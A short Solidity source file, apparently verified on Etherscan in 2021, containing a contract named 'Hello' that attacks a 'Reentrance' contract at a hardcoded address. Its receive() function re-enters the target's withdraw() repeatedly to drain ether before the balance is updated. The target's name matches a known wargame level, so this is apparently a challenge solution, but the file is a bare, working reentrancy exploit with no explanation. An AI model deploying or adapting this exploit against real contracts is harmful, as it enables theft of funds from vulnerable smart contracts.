/**
 *Submitted for verification at Etherscan.io on 2021-10-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Reentrance {
    function donate(address _to) public payable {}
    function withdraw(uint _amount) public {}
}

contract Hello {
    Reentrance r;
    uint entered = 0;
    uint w = 0;

    constructor() {
        r = Reentrance(0x2394FE0E02ae0ceC92b4f858031E1eAF3f744c2e);
    }

    receive() external payable {
        if (entered < w) {
            r.withdraw(1 ether);
            entered++;
        }
    }

    function pay() external payable {}

    function donate(address a) external {
        r.donate{value: 1 ether}(a);
    }

    function withdraw(uint total) external {
        w = total;
        r.withdraw(1 ether);
    }
}